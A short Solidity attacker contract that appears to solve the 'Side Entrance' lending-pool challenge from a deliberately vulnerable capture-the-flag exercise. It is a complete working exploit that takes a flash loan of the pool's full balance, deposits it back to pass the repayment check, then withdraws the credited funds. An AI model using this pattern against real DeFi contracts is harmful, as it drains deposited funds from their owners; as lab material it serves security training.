// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {

    SideEntranceLenderPool pool;

    constructor(address addr) {
        pool = SideEntranceLenderPool(addr);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() public {
        pool.withdraw();
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to withdraw");
    }

    // Do not forget this, as receive function is required for receiving eth.
    receive() external payable {}
}
